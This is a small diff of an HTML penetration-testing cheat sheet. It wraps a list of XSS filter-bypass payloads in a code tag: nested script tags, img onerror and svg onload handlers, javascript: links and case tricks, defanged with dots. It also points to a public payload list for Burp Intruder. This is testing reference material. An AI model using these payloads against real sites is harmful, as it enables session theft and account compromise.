@@ -50,7 +50,7 @@ is it being blocked due to the spaces? remove all spaces from the attack payload
 <br>
 <h2>XSS Filter Bypasses</h2> <br>
 <b>Remove . from all payloads</b> <br>
-Is <.script>alert(1)<./script.> filtered? Try: <br>
+<code> "Is <.script>alert(1)<./script.> filtered? Try: <br>
 <.scr<.script>ipt>alert(1)<./scr<./script.>ipt> <br>
 <.img src=x onerror=alert(1)> <br>
 <.svg/onload=alert(1)> <br>
@@ -59,7 +59,8 @@ Is <.script>alert(1)<./script.> filtered? Try: <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
 <.a href=javascript:alert(1)>click</a.><br>
 <.ScRiPt>alert(1)<./ScRiPt><br>
- <.svg onload/%0A=alert;throw 1337><br>
+ <.svg onload/%0A=alert;throw 1337><br>"
+  </code>
  <br>
 Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
  <br>
